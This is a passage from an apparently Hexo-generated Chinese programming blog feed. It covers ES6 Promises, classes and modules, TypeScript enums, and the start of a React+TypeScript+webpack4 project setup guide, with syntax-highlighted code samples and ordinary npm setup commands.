class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Yay!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// ... some code</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token comment" spellcheck="true">/* 异步操作成功 */</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Promise构造函数接受一个函数作为参数，该函数的两个参数分别是resolve和reject。它们是两个函数，由 JavaScript 引擎提供，不用自己部署。</p><p>resolve函数的作用是，将Promise对象的状态从“未完成”变为“成功”（即从 pending 变为 resolved），在异步操作成功时调用，并将异步操作的结果，作为参数传递出去；reject函数的作用是，将Promise对象的状态从“未完成”变为“失败”（即从 pending 变为 rejected），在异步操作失败时调用，并将异步操作报出的错误，作为参数传递出去。</p><p>Promise实例生成以后，可以用then方法分别指定resolved状态和rejected状态的回调函数。</p><pre class="line-numbers language-js"><code class="language-js">promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// success</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// failure</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>then方法可以接受两个回调函数作为参数。第一个回调函数是Promise对象的状态变为resolved时调用，第二个回调函数是Promise对象的状态变为rejected时调用。其中，第二个函数是可选的，不一定要提供。这两个函数都接受Promise对象传出的值作为参数。</p><h3 id="8、类Class"><a href="#8、类Class" class="headerlink" title="8、类Class"></a>8、类Class</h3><p>JavaScript 语言中，生成实例对象的传统方法是通过构造函数。下面是一个例子。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Point</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span><span class="token punctuation">}</span>Point<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>toString <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token string">'('</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">+</span> <span class="token string">', '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">+</span> <span class="token string">')'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Point</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这种写法跟传统的面向对象语言（比如 C++ 和 Java）差异很大，很容易让新学习这门语言的程序员感到困惑。</p><p>ES6 提供了更接近传统语言的写法，引入了 Class（类）这个概念，作为对象的模板。通过<code>class</code>关键字，可以定义类。</p><p>基本上，ES6 的<code>class</code>可以看作只是一个语法糖，它的绝大部分功能，ES5 都可以做到，新的<code>class</code>写法只是让对象原型的写法更加清晰、更像面向对象编程的语法而已。上面的代码用 ES6 的<code>class</code>改写，就是下面这样。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Point</span> <span class="token punctuation">{</span>  <span class="token function">constructor</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token string">'('</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">+</span> <span class="token string">', '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">+</span> <span class="token string">')'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面代码定义了一个“类”，可以看到里面有一个<code>constructor</code>方法，这就是构造方法，而<code>this</code>关键字则代表实例对象。也就是说，ES5 的构造函数<code>Point</code>，对应 ES6 的<code>Point</code>类的构造方法。</p><p><code>Point</code>类除了构造方法，还定义了一个<code>toString</code>方法。注意，定义“类”的方法的时候，前面不需要加上<code>function</code>这个关键字，直接把函数定义放进去了就可以了。另外，方法之间不需要逗号分隔，加了会报错。</p><h3 id="9、Modules模块"><a href="#9、Modules模块" class="headerlink" title="9、Modules模块"></a>9、Modules模块</h3><p>众所周知，在ES6以前JavaScript并不支持本地的模块。人们想出了AMD，RequireJS，CommonJS以及其它解决方法。现在ES6中可以用模块import 和export 操作了。<br> 在ES5中，你可以在 <script>中直接写可以运行的代码（简称IIFE），或者一些库像AMD。然而在ES6中，你可以用export导入你的类。下面举个例子，在ES5中,module.js有port变量和getAccounts 方法:</p><pre class="line-numbers language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  port<span class="token punctuation">:</span> <span class="token number">3000</span><span class="token punctuation">,</span>  getAccounts<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">...</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在ES5中，main.js需要依赖require('module') 导入module.js：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> service <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'module.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>service<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 3000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但在ES6中，我们将用export 和 import。例如，这是我们用ES6 写的module.js文件库：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">var</span> port <span class="token operator">=</span> <span class="token number">3000</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">getAccounts</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token operator">...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果用ES6来导入到文件main.js中，我们需用import 语法，例如：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">{</span>port<span class="token punctuation">,</span> getAccounts<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'module'</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 3000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者我们可以在main.js中把整个模块导入, 并命名为 service：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> service <span class="token keyword">from</span> <span class="token string">'module'</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>service<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 3000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></script></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> es </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript枚举</title>
      <link href="2019/08/01/enum/"/>
      <url>2019/08/01/enum/</url>
      
        <content type="html"><![CDATA[<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>枚举（Enum）类型用于取值被限定在一定范围内的场景，比如一周只能有七天，颜色限定为红绿蓝等</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>使用枚举来定义关键字</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">enum</span> Days <span class="token punctuation">{</span>Sun<span class="token punctuation">,</span> Mon<span class="token punctuation">,</span> Tue<span class="token punctuation">,</span> Wed<span class="token punctuation">,</span> Thu<span class="token punctuation">,</span> Fri<span class="token punctuation">,</span> Sat<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举成员会被赋值成从0开始，同行枚举名和值也会进行反向映射：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">enum</span> Days <span class="token punctuation">{</span>Sun<span class="token punctuation">,</span> Mon<span class="token punctuation">,</span> Tue<span class="token punctuation">,</span> Wed<span class="token punctuation">,</span> Thu<span class="token punctuation">,</span> Fri<span class="token punctuation">,</span> Sat<span class="token punctuation">}</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Days<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'Sun'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Days<span class="token punctuation">[</span><span class="token string">'Sat'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="手动赋值"><a href="#手动赋值" class="headerlink" title="手动赋值"></a>手动赋值</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">enum</span> Days <span class="token punctuation">{</span>Sun<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span> Mon<span class="token punctuation">,</span> Tue<span class="token punctuation">,</span> Wed<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> Thu<span class="token punctuation">,</span> Fri<span class="token punctuation">,</span> Sat<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>未被赋值的枚举项会接着上一个枚举项递增 如：</p><pre class="line-numbers language-js"><code class="language-js">上面的枚举值会被编译成以下结果<span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"Wed"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"Thu"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"Fri"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"Sat"</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">"Sun"</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">"Mon"</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">"Tue"</span><span class="token punctuation">,</span> Sun<span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> Mon<span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span> Tue<span class="token punctuation">:</span> <span class="token number">9</span><span class="token punctuation">,</span> Wed<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> Thu<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> Fri<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> Sat<span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> Sun<span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> Mon<span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span> Tue<span class="token punctuation">:</span> <span class="token number">9</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 如果未被赋值的和手动赋值的重复了，TypeScript不会报错，后者会覆盖前者</p><p>所以使用的时候需要注意，最好不要出现这种覆盖的情况</p><p>手动赋值的枚举项可以不是数字，但是必须要使用类型断言来人tsc无视类型检查：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">enum</span> Days <span class="token punctuation">{</span>Sun<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span> Mon<span class="token punctuation">,</span> Tue<span class="token punctuation">,</span> Wed<span class="token punctuation">,</span> Thu<span class="token punctuation">,</span> Fri<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">{</span> value<span class="token punctuation">:</span> <span class="token number">123</span><span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token string">'Fri'</span><span class="token punctuation">}</span> <span class="token keyword">as</span> any<span class="token punctuation">)</span><span class="token punctuation">,</span> Sat<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Sat'</span> <span class="token keyword">as</span> any<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果手动赋值的是非数字的话，手动赋值的枚举项后面也必须都要赋值，否则会报错：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">enum</span> Days <span class="token punctuation">{</span>Sun<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span> Mon<span class="token punctuation">,</span> Tue<span class="token punctuation">,</span> Wed<span class="token punctuation">,</span> Thu<span class="token punctuation">,</span> Fri<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">{</span> value<span class="token punctuation">:</span> <span class="token number">123</span><span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token string">'Fri'</span><span class="token punctuation">}</span> <span class="token keyword">as</span> any<span class="token punctuation">)</span><span class="token punctuation">,</span> Sat<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Enum member must have initializer.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>手动赋值也可以是小数或者负数，后续为赋值的项仍是递增加1</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">enum</span> Days <span class="token punctuation">{</span>Sun <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">,</span> Mon <span class="token operator">=</span> <span class="token number">1.5</span><span class="token punctuation">,</span> Tue<span class="token punctuation">,</span> Wed<span class="token punctuation">,</span> Thu<span class="token punctuation">,</span> Fri<span class="token punctuation">,</span> Sat<span class="token punctuation">}</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Days<span class="token punctuation">[</span><span class="token string">"Sun"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Days<span class="token punctuation">[</span><span class="token string">"Mon"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">1.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Days<span class="token punctuation">[</span><span class="token string">"Tue"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Days<span class="token punctuation">[</span><span class="token string">"Sat"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">6.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="常数项和计算所得项"><a href="#常数项和计算所得项" class="headerlink" title="常数项和计算所得项"></a>常数项和计算所得项</h2><p>枚举项有两种类型：常数项（constant member）和计算所得项（computed member）。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">enum</span> Color <span class="token punctuation">{</span>Red<span class="token punctuation">,</span> Green<span class="token punctuation">,</span> Blue <span class="token operator">=</span> <span class="token string">'blue'</span><span class="token punctuation">.</span>length<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>&#39;blue&#39;.length</code>就是计算所得项；</p><p>如果紧接着计算所得项后面是未手动赋值的项，那么他就会因为无法获得初始值而报错：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">enum</span> Color <span class="token punctuation">{</span>Red <span class="token operator">=</span> <span class="token string">'red'</span><span class="token punctuation">.</span>length<span class="token punctuation">,</span> Green<span class="token punctuation">,</span> Blue<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Enum member must have initializer.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>满足一下条件的枚举成员被当做是常数：</p><ul><li><p>没有初始化函数并且之前的枚举成员是常数；这种情况下当前枚举成员的值是上一个成员+1；第一个枚举成员如果没有初始化，那么他的初始值为0</p></li><li><p>枚举成员使用常数枚举表达式初始化；常数枚举表达式是 TypeScript 表达式的子集，它可以在编译阶段求值。当一个表达式满足下面条件之一时，它就是一个常数枚举表达式：</p><ul><li><p>数字字面量（即数字自己，不需要其他符号）</p></li><li><p>引用之前定义的常数枚举成员（可以是在不同的枚举类型中定义的）如果这个成员是在同一个枚举类型中定义的，可以使用非限定名来引用</p></li><li><p>带括号的常数枚举表达式</p></li><li><p><code>+</code>, <code>-</code>, <code>~</code> 一元运算符应用于常数枚举表达式</p></li><li><p><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code>, <code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code>, <code>&amp;</code>, <code>|</code>, <code>^</code> 二元运算符，常数枚举表达式做为其一个操作对象。若常数枚举表达式求值后为 NaN 或 Infinity，则会在编译阶段报错</p></li></ul></li></ul><h2 id="常数枚举"><a href="#常数枚举" class="headerlink" title="常数枚举"></a>常数枚举</h2><p>常数枚举是使用 <code>const enum</code> 定义的枚举类型：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> <span class="token keyword">enum</span> Directions <span class="token punctuation">{</span> up<span class="token punctuation">,</span> down<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">let</span> directions <span class="token operator">=</span> <span class="token punctuation">[</span>Directions<span class="token punctuation">.</span>up<span class="token punctuation">,</span>Directions<span class="token punctuation">.</span>down<span class="token punctuation">,</span>Directions<span class="token punctuation">.</span>left<span class="token punctuation">,</span>Directions<span class="token punctuation">.</span>right<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//[0, 1, 2, 3]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>与普通枚举的区别是在编译阶段会被删除，并且不能包含计算成员。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> <span class="token keyword">enum</span> Color <span class="token punctuation">{</span>Red<span class="token punctuation">,</span> Green<span class="token punctuation">,</span> Blue <span class="token operator">=</span> <span class="token string">'blue'</span><span class="token punctuation">.</span>length<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//const enum member initializers can only contain literal values and other computed enum values.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="外部枚举"><a href="#外部枚举" class="headerlink" title="外部枚举"></a>外部枚举</h2><p>外部枚举用来描述已经存在的枚举类型的形状。</p><pre class="line-numbers language-js"><code class="language-js">declare <span class="token keyword">enum</span> Directions <span class="token punctuation">{</span> up<span class="token punctuation">,</span> down<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">let</span> directions <span class="token operator">=</span> <span class="token punctuation">[</span>Directions<span class="token punctuation">.</span>up<span class="token punctuation">,</span>Directions<span class="token punctuation">.</span>down<span class="token punctuation">,</span>Directions<span class="token punctuation">.</span>left<span class="token punctuation">,</span>Directions<span class="token punctuation">.</span>right<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>declare</code> 定义的类型只会用于编译时的检查，编译结果中会被删除。</p><p>外部枚举和非外部枚举之间有一个重要的区别，在正常的枚举里，没有初始化方法的成员被当成常数成员。 对于非常数的外部枚举而言，没有初始化方法时被当做需要经过计算的。</p><p>外部枚举与声明语句一样，常出现在声明文件中。</p><p>同时使用 <code>declare</code> 和 <code>const</code> 也是可以的：</p><pre class="line-numbers language-js"><code class="language-js">declare <span class="token keyword">const</span> <span class="token keyword">enum</span> Directions <span class="token punctuation">{</span> up<span class="token punctuation">,</span> down<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">let</span> directions <span class="token operator">=</span> <span class="token punctuation">[</span>Directions<span class="token punctuation">.</span>up<span class="token punctuation">,</span>Directions<span class="token punctuation">.</span>down<span class="token punctuation">,</span>Directions<span class="token punctuation">.</span>left<span class="token punctuation">,</span>Directions<span class="token punctuation">.</span>right<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//[0, 1, 2, 3]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React+TypeScript+webpack4多入口配置</title>
      <link href="2019/07/29/rtwebpack/"/>
      <url>2019/07/29/rtwebpack/</url>
      
        <content type="html"><![CDATA[<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul><li>React-16.8.*</li><li>react-router-dom-4.3.*</li><li>TypeScript-3.5.*</li><li>webpack-4.*</li><li>eslint-5.16.*</li></ul><h2 id="项目目录"><a href="#项目目录" class="headerlink" title="项目目录"></a>项目目录</h2><pre class="line-numbers language-js"><code class="language-js">├── dist # 打包结果目录│   ├── demo1 <span class="token comment" spellcheck="true">//类别demo1的打包结果</span>│    │    ├── demo1<span class="token punctuation">.</span>himl│   │    ├── demo1<span class="token punctuation">.</span>js│    │    └── demo1<span class="token punctuation">.</span>css│   └── demo2 <span class="token operator">...</span> <span class="token comment" spellcheck="true">//类别demo2的打包结果</span>├── src # 业务资源文件目录│    ├── category <span class="token comment" spellcheck="true">//项目分类</span>│    │    ├── demo1│    │    ├── demo2│    │    └── <span class="token operator">...</span>│    ├── components <span class="token comment" spellcheck="true">//公共组件</span>│    ├── util <span class="token comment" spellcheck="true">//公共资源</span>│    └── custom<span class="token punctuation">.</span>d<span class="token punctuation">.</span>ts <span class="token comment" spellcheck="true">//项目全局变量声明文件</span>├── index<span class="token punctuation">.</span>html <span class="token comment" spellcheck="true">//项目启动入口</span>├── <span class="token punctuation">.</span>gitignore <span class="token comment" spellcheck="true">//git忽略文件</span>├── <span class="token punctuation">.</span>eslintrc<span class="token punctuation">.</span>js <span class="token comment" spellcheck="true">//eslint校验配置</span>├── <span class="token keyword">package</span><span class="token punctuation">.</span>json <span class="token comment" spellcheck="true">//依赖包</span>├── tsconfig<span class="token punctuation">.</span>json <span class="token comment" spellcheck="true">//ts配置</span>├── webpack<span class="token punctuation">.</span>config<span class="token punctuation">.</span>build<span class="token punctuation">.</span>js <span class="token comment" spellcheck="true">//webpack打包</span>├── webpack<span class="token punctuation">.</span>config<span class="token punctuation">.</span>base<span class="token punctuation">.</span>js <span class="token comment" spellcheck="true">//webpack基础配置</span>└── webpack<span class="token punctuation">.</span>config<span class="token punctuation">.</span>js <span class="token comment" spellcheck="true">//项目启动配置</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于复杂或多人开发的 <code>React</code> 项目来说，管理和使用每个组件的 <code>props</code> 、 <code>state</code> 或许会成为一件让人头痛的事情，而为每一个组件写文档，成本也会比较大，对项目的开发效率也不是最理想的。</p><p><code>Typescript</code> 给 <code>React</code> 带来很多好处：</p><ul><li>在组件头部定义 <code>interface</code>，让每个人在拿到组件的第一时间就可以很明确知道该组件需要使用的 <code>props</code> 和 <code>state</code>；</li><li>在编译中发现问题，减少运行时的报错；</li><li>可以在编辑器中实现实时类型校验、引用查询；</li><li>约束类型，在混合多语言环境中降低风险，等。</li></ul><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>要搭建一个React+TypeScript+webpack的项目的话，一般都是团队开发多人多文件项目，在搭建之前需要优先考虑以下几个方面：</p><ul><li>开发体验</li><li>项目打包</li><li>团队规范</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li><p>前置安装<br>首先需要全局安装typescript，这里默认大家都已经安装了node以及npm</p><pre class="line-numbers language-js"><code class="language-js">npm install <span class="token operator">-</span>g typescript<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>首先新建文件夹并进入</p><pre class="line-numbers language-js"><code class="language-js">mkdir tsDemo <span class="token operator">&amp;&amp;</span> cd tsDemo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>然后进行初始化，生成<code>package.json</code>和<code>tsconfig.json</code></p><pre class="line-numbers language-js"><code class="language-js">npm init <span class="token operator">-</span>y <span class="token operator">&amp;&amp;</span> tsc <span class="token operator">--</span>init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>安装开发工具</p><pre class="line-numbers language-js"><code class="language-js">npm install<span class="token operator">-</span>D webpack webpack<span class="token operator">-</span>cli webpack<span class="token operator">-</span>dev<span class="token operator">-</span>server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>安装react相关<br>因为需要整合ts，而react原本的包是不包含验证包的，所以这里也需要安装相关ts验证包</p><pre class="line-numbers language-js"><code class="language-js">npm install <span class="token operator">-</span>S react react<span class="token operator">-</span>domnpm install <span class="token operator">-</span>D @types<span class="token operator">/</span>react @types<span class="token operator">/</span>react<span class="token operator">-</span>dom<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>安装<code>ts-loader</code></p><pre class="line-numbers language-js"><code class="language-js">npm install <span class="token operator">-</span>D ts<span class="token operator">-</span>loader<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>以上是基本的 后续会贴出项目demo里面包含所有依赖包</p></li></ul><h2 id="webpack配置"><a href="#webpack配置" class="headerlink" title="webpack配置"></a>webpack配置</h2><h3 id="添加webpack文件"><a href="#添加webpack文件" class="headerlink" title="添加webpack文件"></a>添加webpack文件</h3><p>根目录下新建webpack.config.base.js、webpack.config.build.js、webpack.config.js文件</p><pre class="line-numbers language-js"><code class="language-js">touch webpack<span class="token 